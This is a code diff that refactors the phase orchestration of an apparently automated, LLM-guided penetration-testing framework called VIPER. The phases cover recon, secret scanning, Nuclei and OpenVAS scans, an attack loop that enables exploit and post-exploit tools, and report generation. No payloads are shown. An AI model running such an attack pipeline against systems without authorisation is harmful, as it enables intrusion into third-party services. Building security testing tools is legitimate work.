+                pipe_res = await phase_pipeline(
+                    target=target, recon_budget_seconds=recon_budget * 60,
+                    graph_engine=self.graph_engine, session=self.session,
+                    settings=self.settings, log_fn=self.log,
+                    pipeline_cls=ReconPipeline,
+                )
+                results["phases"].update(pipe_res)
 
-            # Phase 2: Reconnaissance (with timeout)
+            # Phase 2: Reconnaissance
             if self.recon_engine and datetime.now() < end_time:
-                self.log("\n=== Phase 2: Reconnaissance ===")
-                try:
-                    recon_result = await asyncio.wait_for(
-                        self.recon_engine.full_recon(
-                            self._extract_domain(target_url),
-                            subdomain_enum=True,
-                            port_scan=True,
-                            tech_fingerprint=True,
-                            dns_enum=True
-                        ),
-                        timeout=recon_budget * 60
-                    )
-                    target.subdomains = recon_result.subdomains
-                    target.open_ports = recon_result.open_ports
-                    target.technologies.update(
-                        tech for url_tech in recon_result.technologies.values()
-                        for tech in url_tech.get('technologies', [])
-                    )
-                    results["phases"]["recon"] = recon_result.to_dict()
-                    # VIPER 4.0: Wappalyzer additional tech detection on recon data
-                    if hasattr(self, 'wappalyzer') and self.wappalyzer:
-                        try:
-                            for url_key, tech_data in recon_result.technologies.items():
-                                body_content = tech_data.get('body', '')
-                                hdrs = tech_data.get('headers', {})
-                                if body_content or hdrs:
-                                    wap_techs = self.wappalyzer.analyze(body_content, hdrs)
-                                    if wap_techs:
-                                        target.technologies.update(wap_techs)
-                                        self.log(f"  [Wappalyzer] Detected on {url_key}: {wap_techs}")
-                        except Exception:
-                            pass
-                    # VIPER 4.0: Populate graph from recon
-                    if self.graph_engine and recon_result:
-                        try:
-                            self.graph_engine.populate_from_recon(domain, recon_result)
-                        except Exception as e:
-                            self.log(f"[GraphEngine] Recon population failed: {e}", "WARN")
-                except asyncio.TimeoutError:
-                    self.log(f"Recon timed out after {recon_budget:.1f} min", "WARN")
-                except Exception as e:
-                    self.log(f"Recon error: {e}", "ERROR")
-            
-            # Phase 2.5: Secret Scanning (GitHub leaked credentials)
+                recon_res = await phase_recon(
+                    target_url=target_url, domain=domain, target=target,
+                    recon_engine=self.recon_engine, graph_engine=self.graph_engine,
+                    wappalyzer=getattr(self, 'wappalyzer', None),
+                    recon_budget_minutes=recon_budget, log_fn=self.log,
+                )
+                results["phases"].update(recon_res)
+
+            # Phase 2.5: Secret Scanning
             if self.secret_scanner and datetime.now() < end_time:
-                self.log("\n=== Phase 2.5: Secret Scanning ===")
-                try:
-                    domain = self._extract_domain(target_url)
-                    secret_findings = await asyncio.wait_for(
-                        self.secret_scanner.scan_target(domain, session=self.session),
-                        timeout=120  # 2 min max for secret scanning
-                    )
-                    for sf in secret_findings:
-                        results["findings"].append(sf.to_dict())
-                    results["phases"]["secrets"] = {
-                        "findings_count": len(secret_findings),
-                        "summary": self.secret_scanner.summary(),
-                    }
-                except asyncio.TimeoutError:
-                    self.log("Secret scanning timed out", "WARN")
-                except Exception as e:
-                    self.log(f"Secret scanning error: {e}", "ERROR")
+                sec_res = await phase_secrets(
+                    target_url=target_url, domain=domain,
+                    secret_scanner=self.secret_scanner, session=self.session,
+                    log_fn=self.log,
+                )
+                results["findings"].extend(sec_res.get("findings", []))
+                if sec_res.get("phase"):
+                    results["phases"]["secrets"] = sec_res["phase"]
 
-            # Phase 3: Surface Mapping (with timeout)
+            # Phase 3: Surface Mapping
             if self.surface_mapper and datetime.now() < end_time:
-                self.log("\n=== Phase 3: Surface Mapping ===")
-                try:
-                    surface_result = await asyncio.wait_for(
-                        self.surface_mapper.map_surface(
-                            target_url,
-                            crawl_depth=2,
-                            max_pages=30
-                        ),
-                        timeout=surface_budget * 60
-                    )
-                    target.parameters.update(
-                        p for params in surface_result.url_parameters.values()
-                        for p in params
-                    )
-                    target.js_endpoints = surface_result.js_endpoints
-                    target.api_endpoints = surface_result.api_endpoints
-                    target.endpoints.update(surface_result.api_endpoints)
-                    results["phases"]["surface"] = surface_result.to_dict()
-                    
-                    # Add JS secrets as findings
-                    for secret in surface_result.js_secrets:
-                        results["findings"].append({
-                            "type": "js_secret",
-                            "severity": "high",
-                            "details": secret
-                        })
-                except asyncio.TimeoutError:
-                    self.log(f"Surface mapping timed out after {surface_budget:.1f} min", "WARN")
-                except Exception as e:
-                    self.log(f"Surface mapping error: {e}", "ERROR")
+                surf_res = await phase_surface(
+                    target_url=target_url, domain=domain, target=target,
+                    surface_mapper=self.surface_mapper, db=self.db,
+                    surface_budget_minutes=surface_budget,
+                    session_start_iso=_full_hunt_session_start, log_fn=self.log,
+                )
+                results["findings"].extend(surf_res.get("findings", []))
+                if surf_res.get("phase"):
+                    results["phases"]["surface"] = surf_res["phase"]
 
-            # Phase 4: Nuclei Scanning (with timeout)
-            if self.nuclei_scanner and self.nuclei_scanner.nuclei_path and datetime.now() < end_time:
-                self.log("\n=== Phase 4: Nuclei Scanning ===")
-                try:
-                    nuclei_result = await asyncio.wait_for(
-                        self.nuclei_scanner.quick_scan(target_url),
-                        timeout=nuclei_budget * 60
-                    )
-                    target.nuclei_findings = [f.to_dict() for f in nuclei_result.findings]
-                    results["nuclei_findings"] = target.nuclei_findings
-                    results["phases"]["nuclei"] = nuclei_result.to_dict()
-                    # Wire nuclei findings into main findings list
-                    for nf in nuclei_result.findings:
-                        vuln_type = self.nuclei_scanner._categorize_finding(nf)
-                        nuclei_finding = {
-                            "type": vuln_type,
-                            "attack": vuln_type,
-                            "vuln_type": vuln_type,
-                            "severity": nf.severity.lower(),
-                            "url": nf.matched_at,
-                            "payload": nf.template_id,
-                            "details": f"Nuclei: {nf.template_name} ({nf.template_id})",
-                            "source": "nuclei",
-                            "validated": True,  # Nuclei has its own validation
-                            "confidence": 0.85,
-                            "template_id": nf.template_id,
-                        }
-                        results["findings"].append(nuclei_finding)
-                        target.vulns_found.append(nuclei_finding)
-                        self.metrics["total_findings"] += 1
-                        # Persist to DB
-                        if self.db:
-                            try:
-                                domain = urllib.parse.urlparse(target_url).netloc
-                                tid = self.db.add_target(target_url, domain)
-                                self.db.add_finding(
-                                    target_id=tid, vuln_type=vuln_type,
-                                    severity=nf.severity.lower(),
-                                    title=f"Nuclei: {nf.template_name}",
-                                    url=nf.matched_at,
-                                    payload=nf.template_id,
-                                    evidence=nf.curl_command or "",
-                                    confidence=0.85,
-                                    validated=True,
-                                )
-                            except Exception:
-                                pass
-                    self.log(f"  Nuclei: {len(nuclei_result.findings)} findings wired to main list")
-                    # VIPER 4.0: MITRE enrichment for nuclei findings
-                    if self.mitre_enricher and nuclei_result.findings:
-                        for finding in results["findings"]:
-                            if finding.get("source") == "nuclei":
-                                cves = finding.get("cves", [])
-                                for cve_id in cves:
-                                    enrichment = self.mitre_enricher.enrich_cve(cve_id)
-                                    if enrichment and enrichment.get("cwes"):
-                                        finding["mitre_enrichment"] = enrichment
-                except asyncio.TimeoutError:
-                    self.log(f"Nuclei timed out after {nuclei_budget:.1f} min", "WARN")
-                except Exception as e:
-                    self.log(f"Nuclei scan error: {e}", "ERROR")
+            # Phase 4: Nuclei Scanning
+            if self.nuclei_scanner and getattr(self.nuclei_scanner, 'nuclei_path', None) and datetime.now() < end_time:
+                nuc_res = await phase_nuclei(
+                    target_url=target_url, domain=domain, target=target,
+                    nuclei_scanner=self.nuclei_scanner, db=self.db,
+                    mitre_enricher=self.mitre_enricher, metrics=self.metrics,
+                    nuclei_budget_minutes=nuclei_budget, log_fn=self.log,
+                )
+                results["findings"].extend(nuc_res.get("findings", []))
+                results["nuclei_findings"] = nuc_res.get("nuclei_findings", [])
+                if nuc_res.get("phase"):
+                    results["phases"]["nuclei"] = nuc_res["phase"]
 
-            # Phase 4b: GVM/OpenVAS Network Scan (optional, non-blocking)
+            # Phase 4b: GVM/OpenVAS Network Scan
             if self.gvm_scanner and datetime.now() < end_time:
-                self.log("\n=== Phase 4b: GVM/OpenVAS Network Scan ===")
-                try:
-                    domain = self._extract_domain(target_url)
-                    if await self.gvm_scanner.is_available():
-                        gvm_budget = min(30, max(5, (end_time - datetime.now()).total_seconds() / 60 * 0.3))
-                        gvm_result = await asyncio.wait_for(
-                            self.gvm_scanner.quick_network_scan(domain),
-                            timeout=gvm_budget * 60,
-                        )
-                        results["phases"]["gvm"] = gvm_result.to_dict()
-                        for gf in gvm_result.findings:
-                            if gf.severity >= 4.0:  # medium+
-                                vf = gf.to_viper_finding()
-                                results["findings"].append(vf)
-                                target.vulns_found.append(vf)
-                                self.metrics["total_findings"] += 1
-                                if self.db:
-                                    try:
-                                        tid = self.db.add_target(target_url, domain)
-                                        self.db.add_finding(
-                                            target_id=tid,
-                                            vuln_type=vf["vuln_type"],
-                                            severity=vf["severity"],
-                                            title=f"OpenVAS: {gf.name}",
-                                            url=f"{gf.host}:{gf.port}",
-                                            payload=gf.oid,
-                                            evidence=gf.description[:500],
-                                            confidence=vf["confidence"],
-                                            validated=True,
-                                        )
-                                    except Exception:
-                                        pass
-                        self.log(f"  GVM: {len(gvm_result.findings)} findings ({sum(1 for f in gvm_result.findings if f.severity >= 7.0)} high+)")
-                    else:
-                        self.log("  GVM not available — skipping network scan", "INFO")
-                except asyncio.TimeoutError:
-                    self.log("GVM scan timed out", "WARN")
-                except Exception as e:
-                    self.log(f"GVM scan error: {e}", "ERROR")
+                gvm_res = await phase_gvm(
+                    target_url=target_url, domain=domain, target=target,
+                    gvm_scanner=self.gvm_scanner, db=self.db,
+                    metrics=self.metrics, end_time=end_time, log_fn=self.log,
+                )
+                results["findings"].extend(gvm_res.get("findings", []))
+                if gvm_res.get("phase"):
+                    results["phases"]["gvm"] = gvm_res["phase"]
 
-            # VIPER 4.0: Orchestrator strategic guidance before manual attacks
-            if self.orchestrator:
-                try:
-                    tech_list = list(target.technologies) if target.technologies else []
-                    objective = f"Security test {target_url} (tech: {', '.join(tech_list[:5])})"
-                    guidance = await self.orchestrator.invoke(target_url, objective)
-                    if guidance:
-                        self.log(f"  [Orchestrator] Strategic guidance: {str(guidance)[:200]}")
-                except Exception as e:
-                    self.log(f"  [Orchestrator] Guidance failed: {e}")
-
-            # Phase 5: Manual VIPER Attacks (guaranteed minimum time)
+            # Phase 5: Manual Attacks
             remaining_seconds = (end_time - datetime.now()).total_seconds()
             manual_minutes = max(manual_min, remaining_seconds / 60.0)
-            manual_minutes = max(3.0, manual_minutes)  # Always at least 3 min
-            self.log(f"\n=== Phase 5: Manual Attacks ({manual_minutes:.1f} min) ===")
-            manual_result = await self.hunt(target_url, max_minutes=int(manual_minutes))
-            results["phases"]["manual"] = manual_result
-            results["findings"].extend(manual_result.get("findings", []))
-            target.access_level = manual_result.get("access_level", 0)
+            manual_res = await phase_manual_attacks(
+                target_url=target_url, target=target,
+                orchestrator=self.orchestrator, phase_engine=self.phase_engine,
+                hunt_fn=self.hunt, react_engine=self._react_engine,
+                manual_minutes=manual_minutes, log_fn=self.log,
+            )
+            results["phases"]["manual"] = manual_res.get("manual", {})
+            results["findings"].extend(manual_res.get("manual", {}).get("findings", []))
+            target.access_level = manual_res.get("manual", {}).get("access_level", 0)
+            if "react_trace" in manual_res:
+                results["react_trace"] = manual_res["react_trace"]
 
-            # Include ReACT reasoning trace if available
-            if self._react_engine and self._react_engine.traces:
-                latest_trace = self._react_engine.traces[-1]
-                results["react_trace"] = latest_trace.to_dict()
-                self.log(f"  ReACT trace: {len(latest_trace.steps)} steps, "
-                         f"LLM-guided={sum(1 for s in latest_trace.steps if s.llm_used)}")
-            
-            # Phase 6: LLM Analysis (direct API if available, else queue)
-            if self.llm_analyzer and results["findings"]:
-                self.log("\n=== Phase 6: LLM Analysis ===")
-                try:
-                    if self.llm_analyzer.has_direct_api:
-                        self.log("  Using direct Claude API for analysis")
-                        # Direct triage of critical findings
-                        for finding in results["findings"][:5]:
-                            if finding.get("severity") in ["critical", "high"]:
-                                triage = await self.llm_analyzer.triage_finding_direct(finding)
-                                if triage:
-                                    finding["llm_triage"] = triage
-                                    self.log(f"  LLM triage: {triage.get('reasoning', '')[:100]}")
-                        # Get next attack recommendations
-                        next_attacks = await self.llm_analyzer.decide_next_attack(
-                            {"url": target_url, "technologies": list(target.technologies)},
-                            list(target.attacks_tried.keys()),
-                            results["findings"][:10],
-                        )
-                        if next_attacks:
-                            results["llm_recommended_attacks"] = next_attacks
-                            self.log(f"  LLM recommends: {next_attacks}")
-                    else:
-                        self.log("  No direct API — queuing for main agent")
-                        for finding in results["findings"][:5]:
-                            if finding.get("severity") in ["critical", "high"]:
-                                await self.llm_analyzer.triage_finding(finding, target_url)
-                        await self.llm_analyzer.get_next_vectors(
-                            target_url, list(target.technologies),
-                            results["findings"], list(target.attacks_tried.keys()),
-                        )
-                except Exception as e:
-                    self.log(f"LLM analysis error: {e}", "ERROR")
-        
-        # Enrich findings with compliance data
-        if COMPLIANCE_AVAILABLE:
-            for finding in results["findings"]:
-                _enrich_compliance(finding)
+            # Phase 6: LLM Analysis
+            llm_res = await phase_llm_analysis(
+                target_url=target_url, target=target,
+                findings=results["findings"], llm_analyzer=self.llm_analyzer,
+                log_fn=self.log,
+            )
+            if "llm_recommended_attacks" in llm_res:
+                results["llm_recommended_attacks"] = llm_res["llm_recommended_attacks"]
 
-        # VIPER 4.0: Save findings to graph + persist
-        if self.graph_engine:
-            try:
-                all_findings = results.get("findings", [])
-                self.graph_engine.populate_from_findings(domain, all_findings)
-                self.graph_engine.save()
-            except Exception as e:
-                self.log(f"[GraphEngine] Finding save failed: {e}", "WARN")
-
-        # Generate report
-        elapsed = (datetime.now() - start_time).total_seconds()
-        results["elapsed_seconds"] = elapsed
-        results["access_level"] = target.access_level
-        
-        report_file = self._generate_full_report(target, results, elapsed)
-        results["report_file"] = str(report_file)
-
-        # Generate HTML report
-        if HTML_REPORTER_AVAILABLE:
-            try:
-                router = None
-                try:
-                    from ai.model_router import ModelRouter
-                    router = ModelRouter()
-                    if not router.is_available:
-                        router = None
-                except Exception:
-                    pass
-                html_content = await _generate_html_report(
-                    findings=results.get("findings", []),
-                    target=target_url,
-                    metadata=results,
-                    model_router=router,
-                )
-                domain = urllib.parse.urlparse(target_url).netloc.replace(":", "_")
-                ts = datetime.now().strftime('%Y%m%d_%H%M%S')
-                html_file = _save_html_report(html_content, f"viper_full_{domain}_{ts}.html")
-                results["html_report_file"] = str(html_file)
-                self.log(f"HTML report: {html_file}")
-            except Exception as e:
-                self.log(f"HTML report generation failed: {e}", "WARN")
-
-        # Close HackerHTTPClient
-        if self.http_client:
-            await self.http_client.close()
-
-        self.log(f"\n=== Hunt Complete ===")
-        self.log(f"Duration: {elapsed:.1f}s")
-        self.log(f"Findings: {len(results['findings'])} ({self.metrics.get('validated_findings', 0)} validated)")
-        self.log(f"False positives caught: {self.metrics.get('false_positives_caught', 0)}")
-        self.log(f"Nuclei: {len(results['nuclei_findings'])}")
-        if "gvm" in results.get("phases", {}):
-            gvm_phase = results["phases"]["gvm"]
-            self.log(f"GVM/OpenVAS: {gvm_phase.get('total_findings', 0)} findings")
-        if self.stealth:
-            stats = self.stealth.get_stats()
-            if stats["level_value"] > 0:
-                self.log(f"Stealth: {stats['level']} | WAFs: {stats['detected_wafs']} | Blocked: {stats['blocked_domains']}")
-        self.log(f"Report: {report_file}")
-
-        if self.db:
-            self.log(f"DB stats: {self.db.stats()}")
-
-        self.save_state()
+        # Post-hunt: compliance, graph, reports, cleanup
+        await phase_finalize(
+            target_url=target_url, domain=domain, target=target,
+            results=results, start_time=start_time,
+            graph_engine=self.graph_engine, db=self.db,
+            stealth=self.stealth, metrics=self.metrics,
+            http_client=self.http_client, log_fn=self.log,
+            generate_full_report_fn=self._generate_full_report,
+            save_state_fn=self.save_state,
+            enrich_compliance_fn=_enrich_compliance if COMPLIANCE_AVAILABLE else None,
+            compliance_available=COMPLIANCE_AVAILABLE,
+            html_reporter_available=HTML_REPORTER_AVAILABLE,
+            generate_html_report_fn=_generate_html_report if HTML_REPORTER_AVAILABLE else None,
+            save_html_report_fn=_save_html_report if HTML_REPORTER_AVAILABLE else None,
+        )
 
         return results
     
     def _extract_domain(self, url: str) -> str:
         """Extract domain from URL"""
-        parsed = urllib.parse.urlparse(url)
-        return parsed.netloc.split(':')[0]
+        from core.utils import extract_domain
+        return extract_domain(url)
     
     # =====================
     # ORIGINAL HUNT METHOD
@@ -2277,12 +1014,15 @@ class ViperCore:
 
         return None
 
-    async def execute_attack(self, target: Target, attack_name: str) -> Tuple[bool, Dict]:
+    async def execute_attack(self, target: Target, attack_name: str, session_start: str = None) -> Tuple[bool, Dict]:
         """Execute an attack against target."""
         attack = self.knowledge.attacks.get(attack_name)
         if not attack:
             return False, {}
-        
+
+        # session_start used for duplicate detection scoping
+        _session_start = session_start or (datetime.utcnow() - timedelta(hours=2)).isoformat()
+
         base_url = target.url.rstrip('/')
         
         for payload in attack.payloads:
@@ -2422,13 +1162,27 @@ class ViperCore:
 
             if status == 0:
                 continue
-            
+
+            # SSRF FP guard: if marker appears in the payload URL itself (URL reflection),
+            # strip the payload from the body before checking success markers
+            _body_for_check = body
+            if "ssrf" in attack_name and isinstance(payload, str):
+                # Remove the payload URL from the body to avoid reflection false positives
+                try:
+                    _body_for_check = body.replace(payload, "").replace(
+                        urllib.parse.quote(payload), ""
+                    )
+                except Exception:
+                    pass
+
             # Smart marker detection with regex and context awareness
-            match_result = self._check_markers(attack.success_markers, body, headers)
+            match_result = self._check_markers(attack.success_markers, _body_for_check, headers)
             if match_result:
                 marker, marker_confidence = match_result
                 candidate = {
                     "attack": attack_name,
+                    "vuln_type": attack_name,  # for compliance_mapper lookup
+                    "type": attack_name,
                     "payload": payload,
                     "marker": marker,
                     "marker_confidence": marker_confidence,
@@ -2463,7 +1217,7 @@ class ViperCore:
                     try:
                         domain = urllib.parse.urlparse(test_url).netloc
                         tid = self.db.add_target(test_url, domain)
-                        is_dup, dup_id = self.db.is_duplicate(tid, attack_name, test_url, payload)
+                        is_dup, dup_id = self.db.is_duplicate(tid, attack_name, test_url, payload, session_start=_session_start)
                         if is_dup:
                             self.log(f"  [DUP] Skipping duplicate of finding #{dup_id}")
                             continue
@@ -2476,8 +1230,8 @@ class ViperCore:
                         )
                         self.db.log_attack(tid, attack_name, payload, success=True,
                                            response_status=status, response_length=len(body))
-                    except Exception:
-                        pass
+                    except (OSError, ValueError, TypeError) as e:
+                        self.log(f"  [DB] Error persisting finding: {e}", "WARN")
 
                 # VIPER 2.0: Generate PoC for high+ findings
                 if self.poc_gen and candidate.get("severity") in ("high", "critical"):
@@ -2485,8 +1239,8 @@ class ViperCore:
                         poc_path = self.poc_gen.save_poc(candidate)
                         candidate["poc_path"] = str(poc_path)
                         self.log(f"  [POC] Saved: {poc_path.name}")
-                    except Exception:
-                        pass
+                    except (OSError, AttributeError) as e:
+                        self.log(f"  [POC] Save failed: {e}", "WARN")
 
                 return True, candidate
 
@@ -2512,6 +1266,8 @@ class ViperCore:
         self.current_target = target
         start_time = datetime.now()
         end_time = start_time + timedelta(minutes=max_minutes)
+        # Session start ISO timestamp — used to scope duplicate detection to this session only
+        _session_start = start_time.isoformat()
 
         self.log(f"Manual hunt: {target_url} ({max_minutes} min)")
 
@@ -2526,12 +1282,8 @@ class ViperCore:
             except Exception as e:
                 self.log(f"[Guardrails] Validation error (proceeding): {e}", "WARN")
 
-        # VIPER 3.0: Phase engine — set initial phase
-        if self.phase_engine:
-            try:
-                self.phase_engine.transition(Phase.RECON if hasattr(Phase, 'RECON') else 'recon')
-            except Exception:
-                pass
+        # VIPER 3.0: Phase engine — already starts at RECON by default (no-op reset)
+        # Note: PhaseEngine has no .transition() — advance_phase() is the correct API
 
         _emit("hunt_start", target=target_url, max_minutes=max_minutes, phase="recon")
 
@@ -2623,7 +1375,7 @@ class ViperCore:
         if self._react_engine:
             self.log("  [ReACT] Using LLM-powered reasoning loop")
 
-            # Build context for ReACT
+            # Build context for ReACT — include current phase so exploit tools are allowed
             react_context = {
                 "technologies": list(target.technologies) if target.technologies else [],
                 "has_input": bool(target.parameters),
@@ -2636,12 +1388,14 @@ class ViperCore:
                 "status_code": status,
                 "response_length": len(body),
                 "headers": {k: v for k, v in list(headers.items())[:10]} if headers else {},
+                # Pass current phase so ReACT engine allows exploit-phase tools
+                "phase": (self.phase_engine.current_phase if self.phase_engine else "EXPLOIT"),
             }
 
             async def react_execute(url, action, ctx):
                 """Bridge between ReACT engine and VIPER's attack execution."""
                 nonlocal findings
-                success, finding = await self.execute_attack(target, action)
+                success, finding = await self.execute_attack(target, action, session_start=_session_start)
                 target.record_attack(action, success)
                 self.knowledge.record_result(action, success, url)
 
@@ -2775,7 +1529,7 @@ class ViperCore:
 
                 self.log(f"  Trying: {attack_name}")
 
-                success, finding = await self.execute_attack(target, attack_name)
+                success, finding = await self.execute_attack(target, attack_name, session_start=_session_start)
                 target.record_attack(attack_name, success)
                 self.knowledge.record_result(attack_name, success, target_url)
                 _emit("attack", action=attack_name, success=success, target=target_url)
@@ -2953,7 +1707,8 @@ class ViperCore:
                 _emit("phase", phase="post_exploit", target=target_url)
                 if self.phase_engine:
                     try:
-                        self.phase_engine.transition(Phase.POST_EXPLOIT if hasattr(Phase, 'POST_EXPLOIT') else 'post_exploit')
+                        if self.phase_engine.current_phase != "POST_EXPLOIT":
+                            self.phase_engine.advance_phase("entering post-exploit phase")
                     except Exception:
                         pass
             except Exception as e:
@@ -2972,6 +1727,8 @@ class ViperCore:
             "access_level": target.access_level,
             "attacks_tried": len(tried_attacks),
             "elapsed_seconds": elapsed,
+            # Expose detected technologies so full_hunt can merge them into its Target
+            "technologies": sorted(target.technologies) if target.technologies else [],
         }
 
         _emit("hunt_end", target=target_url,
@@ -3012,7 +1769,7 @@ class ViperCore:
 | Nuclei Findings | {len(nuclei)} |
 | Access Level | {target.access_level} |
 | Subdomains Found | {len(target.subdomains)} |
-| Technologies | {', '.join(target.technologies) or 'Unknown'} |
+| Technologies | {', '.join(sorted({t.title() for t in target.technologies if t})) or 'Unknown'} |
 | Parameters | {len(target.parameters)} |
 | API Endpoints | {len(target.api_endpoints)} |
 
@@ -3022,21 +1779,33 @@ class ViperCore:
 
 """
         
+        def _finding_name(f):
+            """Resolve the best human-readable name for a finding dict."""
+            return (f.get('attack') or f.get('vuln_type') or f.get('type')
+                    or f.get('template_name') or 'Unknown')
+
+        def _finding_evidence(f):
+            details = f.get('details', {})
+            if isinstance(details, dict):
+                return (details.get('pattern') or details.get('value', '')[:80]
+                        or f.get('marker') or f.get('matcher_name') or 'N/A')
+            return f.get('marker') or f.get('matcher_name') or 'N/A'
+
         # Critical findings first
         critical = [f for f in findings + nuclei if f.get('severity', '').lower() in ['critical', 'high']]
         if critical:
             for i, f in enumerate(critical, 1):
                 report += f"""
-### {i}. {f.get('attack', f.get('template_name', 'Unknown'))} [{f.get('severity', 'N/A').upper()}]
+### {i}. {_finding_name(f)} [{f.get('severity', 'N/A').upper()}]
 
 - **URL:** {f.get('url', f.get('matched_at', 'N/A'))}
 - **Payload:** `{f.get('payload', 'N/A')}`
-- **Evidence:** {f.get('marker', f.get('matcher_name', 'N/A'))}
+- **Evidence:** {_finding_evidence(f)}
 
 """
         else:
             report += "*No critical vulnerabilities found*\n"
-        
+
         # All findings
         report += """
 ---
@@ -3044,10 +1813,10 @@ class ViperCore:
 ## All Findings
 
 """
-        
+
         for i, f in enumerate(findings, 1):
-            report += f"- [{f.get('severity', 'N/A').upper()}] {f.get('attack', 'Unknown')} @ {f.get('url', 'N/A')}\n"
-        
+            report += f"- [{f.get('severity', 'N/A').upper()}] {_finding_name(f)} @ {f.get('url', 'N/A')}\n"
+
         for i, f in enumerate(nuclei, 1):
             report += f"- [NUCLEI] [{f.get('severity', 'N/A').upper()}] {f.get('template_name', 'Unknown')}\n"
         
@@ -3061,11 +1830,13 @@ class ViperCore:
 
 ### Subdomains ({len(recon.get('subdomains', []))})
 """
-            for sub in list(recon.get('subdomains', []))[:20]:
+            # Filter empty, None, and tool error messages (valid hostnames have no spaces)
+            subs = [s for s in recon.get('subdomains', [])
+                    if s and str(s).strip() and ' ' not in str(s) and len(str(s)) < 253]
+            for sub in subs[:20]:
                 report += f"- {sub}\n"
-            
-            if len(recon.get('subdomains', [])) > 20:
-                report += f"- ... and {len(recon['subdomains']) - 20} more\n"
+            if len(subs) > 20:
+                report += f"- ... and {len(subs) - 20} more\n"
         
         # Surface mapping
         if "surface" in results.get("phases", {}):
@@ -3080,10 +1851,14 @@ class ViperCore:
             for url, params in list(surface.get('url_parameters', {}).items())[:10]:
                 report += f"- `{url}`: {params}\n"
             
-            if surface.get('js_secrets'):
+            # Read JS secrets from deduplicated findings, not raw surface dict
+            js_secret_findings = [f for f in findings if f.get('vuln_type') == 'js_secret']
+            if js_secret_findings:
                 report += "\n### Potential Secrets in JS\n"
-                for secret in surface.get('js_secrets', [])[:5]:
-                    report += f"- Source: {secret.get('source')}\n"
+                for sf in js_secret_findings[:10]:
+                    src = sf.get('url') or sf.get('details', {}).get('source', 'unknown')
+                    pat = sf.get('details', {}).get('pattern', '')
+                    report += f"- `{pat}` in {src}\n"
         
         # Compliance mapping section
         if COMPLIANCE_AVAILABLE and findings:
